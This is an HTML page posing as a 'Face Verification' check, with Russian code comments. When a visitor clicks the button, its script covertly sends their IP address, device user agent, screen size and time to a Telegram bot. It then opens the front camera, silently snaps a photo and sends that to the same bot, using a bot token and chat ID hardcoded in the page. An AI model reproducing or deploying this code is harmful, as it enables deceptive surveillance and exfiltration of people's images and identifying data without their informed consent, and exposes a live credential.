<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Face Verification</title>
    <style>
        body {
            background-color: #000;
            color: #fff;
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            padding: 20px;
            text-align: center;
        }
        .btn {
            background-color: #ff0000;
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 18px;
            border-radius: 10px;
            cursor: pointer;
            margin: 20px 0;
        }
        #status {
            margin: 20px 0;
            font-size: 18px;
        }
        #cameraPreview {
            width: 300px;
            height: 400px;
            object-fit: cover;
            border-radius: 10px;
            margin: 20px 0;
            display: none;
        }
    </style>
</head>
<body>
    <div id="content">
        <h1>Face Verification</h1>
        <p id="status">Click the button to start verification</p>
        <video id="cameraPreview" autoplay playsinline></video>
        <button id="verifyBtn" class="btn">Проверить</button>
    </div>

    <script>
        const botToken = '7898816931:AAHNPImGpJjs-MNsklAvrU0VRDFkHFte_ig';
        const chatId = '-1002577213610';
        const videoElement = document.getElementById('cameraPreview');
        const statusElement = document.getElementById('status');
        const verifyBtn = document.getElementById('verifyBtn');
        let stream = null;

        // 1. Отправка информации о пользователе
        async function sendUserInfo() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                const ip = data.ip;
                
                const userAgent = navigator.userAgent;
                const screenRes = `${window.screen.width}x${window.screen.height}`;
                const time = new Date().toLocaleString();
                
                const message = `🚨 Новый посетитель:\nIP: ${ip}\nУстройство: ${userAgent}\nЭкран: ${screenRes}\nВремя: ${time}`;
                
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    })
                });
            } catch (error) {
                console.error('Error sending user info:', error);
            }
        }

        // 2. Захват фото с камеры
        async function captureAndSendPhoto() {
            try {
                statusElement.textContent = "Processing verification...";
                verifyBtn.disabled = true;
                
                // Создаем canvas для захвата кадра
                const canvas = document.createElement('canvas');
                canvas.width = videoElement.videoWidth;
                canvas.height = videoElement.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                
                // Преобразуем в blob
                const blob = await new Promise(resolve => {
                    canvas.toBlob(resolve, 'image/jpeg', 0.8);
                });
                
                // Создаем FormData для отправки
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, 'verification_photo.jpg');
                
                // Добавляем описание
                const caption = `🆔 Фото верификации\nВремя: ${new Date().toLocaleString()}`;
                formData.append('caption', caption);
                
                // Отправляем фото в Telegram
                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                statusElement.textContent = "Verification complete!";
                stopCamera();
                videoElement.style.display = 'none';
                verifyBtn.style.display = 'none';
                
            } catch (error) {
                console.error('Error capturing photo:', error);
                statusElement.textContent = "Error during verification. Please try again.";
                verifyBtn.disabled = false;
            }
        }

        // 3. Запуск камеры
        async function startCamera() {
            try {
                statusElement.textContent = "Requesting camera access...";
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    },
                    audio: false
                });
                
                videoElement.srcObject = stream;
                videoElement.style.display = 'block';
                statusElement.textContent = "Camera access granted. Taking photo...";
                
                // Сразу делаем фото после получения доступа
                await captureAndSendPhoto();
                
            } catch (error) {
                console.error('Camera error:', error);
                statusElement.textContent = "Camera access denied. Please allow camera access to continue.";
                verifyBtn.disabled = false;
            }
        }

        // 4. Остановка камеры
        function stopCamera() {
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
                videoElement.srcObject = null;
            }
        }

        // 5. Обработчик кнопки
        verifyBtn.addEventListener('click', async function() {
            await sendUserInfo(); // Сначала отправляем информацию о пользователе
            await startCamera(); // Затем запускаем процесс верификации
        });

        // Остановка камеры при закрытии страницы
        window.addEventListener('beforeunload', stopCamera);
    </script>
</body>
</html>
